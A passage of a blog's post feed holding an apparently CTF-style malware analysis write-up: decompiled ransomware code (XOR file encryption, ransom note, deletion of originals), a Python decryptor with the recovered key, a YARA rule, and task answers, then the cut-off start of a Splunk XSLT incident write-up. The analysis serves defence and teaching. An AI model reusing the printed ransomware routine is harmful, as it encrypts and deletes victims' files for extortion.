</span></span></code></pre></div><p>We discovered an interesting function named <code>encrypt_file</code>. Let&rsquo;s decompile the binary and look at the function&rsquo;s source code using <code>ghidra</code>.</p>
<p>encrypt_file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">encrypt_file</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>param_1,<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  ulong uVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> iVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">size_t</span> sVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> local_848 [<span style="color:#bd93f9">1024</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> local_448 [<span style="color:#bd93f9">1032</span>];
</span></span><span style="display:flex;"><span>  FILE <span style="color:#ff79c6">*</span>local_40;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>local_38;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">size_t</span> local_30;
</span></span><span style="display:flex;"><span>  FILE <span style="color:#ff79c6">*</span>local_28;
</span></span><span style="display:flex;"><span>  ulong local_20;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_28 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(param_1,<span style="color:#f1fa8c">&#34;rb&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (local_28 <span style="color:#ff79c6">==</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error opening file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,param_1);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fseek</span>(local_28,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">ftell</span>(local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">rewind</span>(local_28);
</span></span><span style="display:flex;"><span>    local_38 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span>(local_30);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fread</span>(local_38,<span style="color:#bd93f9">1</span>,local_30,local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fclose</span>(local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> (local_20 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; uVar2 <span style="color:#ff79c6">=</span> local_20, (<span style="color:#8be9fd">long</span>)local_20 <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">long</span>)local_30; local_20 <span style="color:#ff79c6">=</span> local_20 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) {
</span></span><span style="display:flex;"><span>      bVar1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(byte <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">long</span>)local_38 <span style="color:#ff79c6">+</span> local_20);
</span></span><span style="display:flex;"><span>      sVar4 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">strlen</span>(param_2);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>(byte <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">long</span>)local_38 <span style="color:#ff79c6">+</span> local_20) <span style="color:#ff79c6">=</span> bVar1 <span style="color:#ff79c6">^</span> param_2[uVar2 <span style="color:#ff79c6">%</span> sVar4];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">snprintf</span>(local_448,<span style="color:#bd93f9">0x400</span>,<span style="color:#f1fa8c">&#34;%s.24bes&#34;</span>,param_1);
</span></span><span style="display:flex;"><span>    local_28 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(local_448,<span style="color:#f1fa8c">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fwrite</span>(local_38,<span style="color:#bd93f9">1</span>,local_30,local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fclose</span>(local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">free</span>(local_38);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">snprintf</span>(local_848,<span style="color:#bd93f9">0x400</span>,<span style="color:#f1fa8c">&#34;%s_note.txt&#34;</span>,local_448);
</span></span><span style="display:flex;"><span>    local_40 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(local_848,<span style="color:#f1fa8c">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (local_40 <span style="color:#ff79c6">==</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error creating note file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,local_848);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">fwrite</span>(<span style="color:#f1fa8c">&#34;This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>             ,<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">0x99</span>,local_40);
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">fclose</span>(local_40);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">remove</span>(param_1);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (iVar3 <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error deleting original file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,param_1);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Looks like XOR encryption mechanism. I used ChatGPT to describe the function&rsquo;s source code. I got the following response.
Sure, letâs go through this C function <code>encrypt_file</code> step by step to understand how it works.</p>
<h5 id="function-purpose">Function Purpose</h5>
<p>The <code>encrypt_file</code> function reads a file, encrypts its content using a provided key, writes the encrypted content to a new file, and creates a note file indicating the file has been encrypted.</p>
<h5 id="function-parameters">Function Parameters</h5>
<ul>
<li><code>char *param_1</code>: The name (or path) of the file to be encrypted.</li>
<li><code>char *param_2</code>: The encryption key used to encrypt the file content.</li>
</ul>
<h5 id="local-variables">Local Variables</h5>
<ul>
<li><code>byte bVar1</code>: A byte variable used in the encryption process.</li>
<li><code>ulong uVar2</code>: A variable used in the encryption process for indexing.</li>
<li><code>int iVar3</code>: An integer to check the result of removing the original file.</li>
<li><code>size_t sVar4</code>: Size variable used to store the length of the encryption key.</li>
<li><code>char local_848[1024]</code>: A buffer to store the name of the note file.</li>
<li><code>char local_448[1032]</code>: A buffer to store the name of the encrypted file.</li>
<li><code>FILE *local_40</code>: File pointer for creating the note file.</li>
<li><code>void *local_38</code>: Pointer to dynamically allocated memory for reading the file content.</li>
<li><code>size_t local_30</code>: Variable to store the size of the file being read.</li>
<li><code>FILE *local_28</code>: File pointer for the file being read and the encrypted file being written.</li>
<li><code>ulong local_20</code>: Loop counter used in the encryption process.</li>
</ul>
<h5 id="step-by-step-explanation">Step-by-Step Explanation</h5>
<ol>
<li>
<p><strong>Open the Original File</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>local_28 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(param_1, <span style="color:#f1fa8c">&#34;rb&#34;</span>);
</span></span></code></pre></div><ul>
<li>Attempts to open the file specified by <code>param_1</code> in binary read mode.</li>
<li>If the file cannot be opened, it prints an error message.</li>
</ul>
</li>
<li>
<p><strong>Read the File Content</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#50fa7b">fseek</span>(local_28, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>local_30 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">ftell</span>(local_28);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">rewind</span>(local_28);
</span></span><span style="display:flex;"><span>local_38 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span>(local_30);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">fread</span>(local_38, <span style="color:#bd93f9">1</span>, local_30, local_28);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">fclose</span>(local_28);
</span></span></code></pre></div><ul>
<li>Seeks to the end of the file to determine its size (<code>local_30</code>).</li>
<li>Allocates memory to <code>local_38</code> to hold the file content.</li>
<li>Reads the file content into <code>local_38</code>.</li>
<li>Closes the original file.</li>
</ul>
</li>
<li>
<p><strong>Encrypt the File Content</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (local_20 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; uVar2 <span style="color:#ff79c6">=</span> local_20, (<span style="color:#8be9fd">long</span>)local_20 <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">long</span>)local_30; local_20 <span style="color:#ff79c6">=</span> local_20 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) {
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(byte <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">long</span>)local_38 <span style="color:#ff79c6">+</span> local_20);
</span></span><span style="display:flex;"><span>    sVar4 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">strlen</span>(param_2);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(byte <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">long</span>)local_38 <span style="color:#ff79c6">+</span> local_20) <span style="color:#ff79c6">=</span> bVar1 <span style="color:#ff79c6">^</span> param_2[uVar2 <span style="color:#ff79c6">%</span> sVar4];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Iterates through each byte of the file content.</li>
<li>Encrypts each byte by XORing it with a byte from the encryption key <code>param_2</code>. The key is used in a cyclic manner.</li>
</ul>
</li>
<li>
<p><strong>Write the Encrypted Content to a New File</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#50fa7b">snprintf</span>(local_448, <span style="color:#bd93f9">0x400</span>, <span style="color:#f1fa8c">&#34;%s.24bes&#34;</span>, param_1);
</span></span><span style="display:flex;"><span>local_28 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(local_448, <span style="color:#f1fa8c">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">fwrite</span>(local_38, <span style="color:#bd93f9">1</span>, local_30, local_28);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">fclose</span>(local_28);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">free</span>(local_38);
</span></span></code></pre></div><ul>
<li>Constructs the name for the encrypted file by appending &ldquo;.24bes&rdquo; to the original filename.</li>
<li>Opens the new file in binary write mode.</li>
<li>Writes the encrypted content to this new file.</li>
<li>Closes the new file and frees the allocated memory.</li>
</ul>
</li>
<li>
<p><strong>Create a Note File</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#50fa7b">snprintf</span>(local_848, <span style="color:#bd93f9">0x400</span>, <span style="color:#f1fa8c">&#34;%s_note.txt&#34;</span>, local_448);
</span></span><span style="display:flex;"><span>local_40 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(local_848, <span style="color:#f1fa8c">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (local_40 <span style="color:#ff79c6">==</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error creating note file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, local_848);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fwrite</span>(<span style="color:#f1fa8c">&#34;This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x99</span>, local_40);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fclose</span>(local_40);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Constructs the name for the note file by appending &ldquo;_note.txt&rdquo; to the encrypted file name.</li>
<li>Opens the note file in write mode.</li>
<li>Writes a ransom note to the note file.</li>
<li>Closes the note file.</li>
</ul>
</li>
<li>
<p><strong>Delete the Original File</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>iVar3 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">remove</span>(param_1);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (iVar3 <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error deleting original file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, param_1);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Attempts to delete the original file.</li>
<li>If deletion fails, it prints an error message.</li>
</ul>
</li>
</ol>
<h5 id="functions-purpose">Function&rsquo;s Purpose</h5>
<p>The <code>encrypt_file</code> function encrypts the content of a specified file using a provided key and saves the encrypted content to a new file with a &ldquo;.24bes&rdquo; extension. It also creates a note file containing a message from the &ldquo;bes24 group,&rdquo; and then attempts to delete the original file. This function mimics the behavior of ransomware.</p>
<p>Using the help of ChatGPT I created the following decryption tool in Python.
<strong>Decryptor Tool</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt_file</span>(encrypted_file: <span style="color:#8be9fd;font-style:italic">str</span>, decryption_key: <span style="color:#8be9fd;font-style:italic">str</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Open the encrypted file for reading in binary mode</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(encrypted_file, <span style="color:#f1fa8c">&#39;rb&#39;</span>) <span style="color:#ff79c6">as</span> ef:
</span></span><span style="display:flex;"><span>            encrypted_data <span style="color:#ff79c6">=</span> ef<span style="color:#ff79c6">.</span>read()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Prepare the decryption key</span>
</span></span><span style="display:flex;"><span>        key_length <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">len</span>(decryption_key)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Decrypt the data</span>
</span></span><span style="display:flex;"><span>        decrypted_data <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytearray</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(encrypted_data)):
</span></span><span style="display:flex;"><span>            decrypted_byte <span style="color:#ff79c6">=</span> encrypted_data[i] <span style="color:#ff79c6">^</span> <span style="color:#8be9fd;font-style:italic">ord</span>(decryption_key[i <span style="color:#ff79c6">%</span> key_length])
</span></span><span style="display:flex;"><span>            decrypted_data<span style="color:#ff79c6">.</span>append(decrypted_byte)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Prepare the output file name by removing the .24bes extension</span>
</span></span><span style="display:flex;"><span>        output_file <span style="color:#ff79c6">=</span> encrypted_file<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;.24bes&#39;</span>, <span style="color:#f1fa8c">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Write the decrypted data to the output file</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(output_file, <span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> df:
</span></span><span style="display:flex;"><span>            df<span style="color:#ff79c6">.</span>write(decrypted_data)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;File decrypted successfully: </span><span style="color:#f1fa8c">{</span>encrypted_file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> -&gt; </span><span style="color:#f1fa8c">{</span>output_file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> FileNotFoundError:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: The file </span><span style="color:#f1fa8c">{</span>encrypted_file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> does not exist.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;An error occurred: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt_directory</span>(directory: <span style="color:#8be9fd;font-style:italic">str</span>, decryption_key: <span style="color:#8be9fd;font-style:italic">str</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Get all files in the directory with .24bes extension</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> filename <span style="color:#ff79c6">in</span> os<span style="color:#ff79c6">.</span>listdir(directory):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> filename<span style="color:#ff79c6">.</span>endswith(<span style="color:#f1fa8c">&#39;.24bes&#39;</span>):
</span></span><span style="display:flex;"><span>            encrypted_file_path <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(directory, filename)
</span></span><span style="display:flex;"><span>            decrypt_file(encrypted_file_path, decryption_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Hardcoded decryption key</span>
</span></span><span style="display:flex;"><span>DECRYPTION_KEY <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;bhUlIshutrea98liOp&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(sys<span style="color:#ff79c6">.</span>argv) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">2</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Usage: python decrypt_files.py &lt;directory&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>        sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    directory <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>isdir(directory):
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: </span><span style="color:#f1fa8c">{</span>directory<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> is not a valid directory.&#34;</span>)
</span></span><span style="display:flex;"><span>        sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    decrypt_directory(directory, DECRYPTION_KEY)
</span></span></code></pre></div><p>Using this tool we were successful in decrypting the files of the <code>forela-criticaldata</code> directory.</p>
<h4 id="virustotal">VirusTotal</h4>
<p><img src="images/20240619191644.png" alt="virustotal score">
<a href="https://www.virustotal.com/gui/file/19ad47d6e0a43e77e1d23534404bd7bb7f0742b961ef2b219160c9ef3945572d/details">VirusTotal - Analysis</a></p>
<h4 id="yara-rule">YARA Rule</h4>
<p>This is my first yara rule. So, please forgive if it&rsquo;s not good.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>rule Bes24Ransomware
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    meta:
</span></span><span style="display:flex;"><span>        description = &#34;Detects Bes24 Ransomware&#34;
</span></span><span style="display:flex;"><span>        author = &#34;Shakil Hossain&#34;
</span></span><span style="display:flex;"><span>        date = &#34;2024-06-19&#34;
</span></span><span style="display:flex;"><span>        version = &#34;1.0&#34;
</span></span><span style="display:flex;"><span>        hash = &#34;19ad47d6e0a43e77e1d23534404bd7bb7f0742b961ef2b219160c9ef3945572d&#34;
</span></span><span style="display:flex;"><span>        score = 32
</span></span><span style="display:flex;"><span>        id = &#34;fcaf0277-67bc-512a-97ff-4e8b30190eef&#34;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    strings:
</span></span><span style="display:flex;"><span>        $str1 = &#34;This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..&#34;
</span></span><span style="display:flex;"><span>        $str2 = &#34;.24bes&#34;
</span></span><span style="display:flex;"><span>        $str3 = &#34;_note.txt&#34;
</span></span><span style="display:flex;"><span>        $str4 = &#34;bes24@protonmail.com&#34;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    condition:
</span></span><span style="display:flex;"><span>        filesize &lt; 20KB
</span></span><span style="display:flex;"><span>        and
</span></span><span style="display:flex;"><span>        any of ($str*)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After recovering the files we accomplished our objectives. Now let&rsquo;s answer the tasks.</p>
<h4 id="task-solution">Task Solution</h4>
<ol>
<li>For task one we already have the encryption key listed above.</li>
<li>We can find the answer in the <code>forela_uk_applicants.sql</code> file.</li>
<li>We can find it in the <code>it_assets.xml</code> file.</li>
<li>We can find it in any file with the <code>.24bes_note.txt</code> extension.</li>
<li>To find this answer we can use <code>jq</code> with following query: <code>jq 'to_entries | map(.value) | max_by(.profit_percentage) | {email, profit_percentage}' trading-firebase_bkup.json</code></li>
<li>We can find this in the <code>sales_forecast.xlsx</code> file.</li>
<li>Also we can find this answer in the hard coded strings section.</li>
<li>Doing an <code>md5sum</code> on the file <code>orela_uk_applicants.sql</code> will get you the answer.</li>
<li>Doing an <code>md5sum</code> on the file <code>trading-firebase_bkup.json</code> will get you the answer.</li>
<li>Doing an <code>md5sum</code> on the file <code>complaints.csv</code> will get you the answer.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please calculate the hashes for the file without modifying the file. You may feel tempting to format a file for better visibility. For forensic purpose make a copy of the original file then do operation on it.
</span></span></code></pre></div><h3 id="summary">Summary</h3>
<p>This was my first malware analysis Sherlock, where I reversed a very simple ransomware. I did static analysis on the binary and found the encryption key and encryption algorithm which facilitate the creation of a decryption tool and recover the business critical files. I also created an YARA rule to detect this malware. It was fun.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://medium.com/@ajmewal/basics-of-elf-executable-and-linkable-format-file-88a516877356">Basics of ELF (Executable and Linkable Format) file by Ajmewal - Medium</a></li>
<li><a href="https://github.com/Neo23x0/yara-uuid-generator">YARA UUID Generator using Hash</a></li>
<li><a href="https://www.veeam.com/blog/yara-rules-malware-detection-analysis.html">Mastering YARA Rules: Malware Detection and Analysis - Veeam</a></li>
</ul>
]]></description></item><item><title>HTB Sherlock Fragility</title><link>https://hshakilst.github.io/posts/htb-sherlocks/fragility/</link><pubDate>Sat, 15 Jun 2024 04:15:59 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/fragility/</guid><description><![CDATA[<h1 id="fragility-dfir">Fragility (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system. One day, he panicked and reported to us that an important file on his computer had disappeared. Moreover, he also discovered a new account on the login screen. Suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. Can you help us investigate it?</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>fragility.zip</td>
<td>e1d81df86e9201f99051c713620fb6c6</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>capture.pcapng</td>
<td>636aa4c094866c852fdebcb1c65d5944</td>
<td>n/a</td>
</tr>
<tr>
<td>Challenge.7z</td>
<td>c1ebd1edb34e2953356b5200ecc673ac</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li>Wireshark - PCAP Analysis</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p>After acquiring the artifacts, I analyzed the PCAP file using Wireshark and exported the HTTP Objects. I found several suspicious requests two of them stands out the most.</p>
<p>The attacker uploaded a malicious <code>XSLT</code> file to the Splunk Server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>XSLT (eXtensible Stylesheet Language Transformations) is the recommended style sheet language for XML. XSLT is far more sophisticated than CSS. With XSLT you can add/remove elements and attributes to or from the output file.
</span></span></code></pre></div><p><img src="images/20240615092924.png" alt="alt text"></p>
<p>The file contained the following payload inside it.</p>
<p><strong>search.xsl</strong></p>
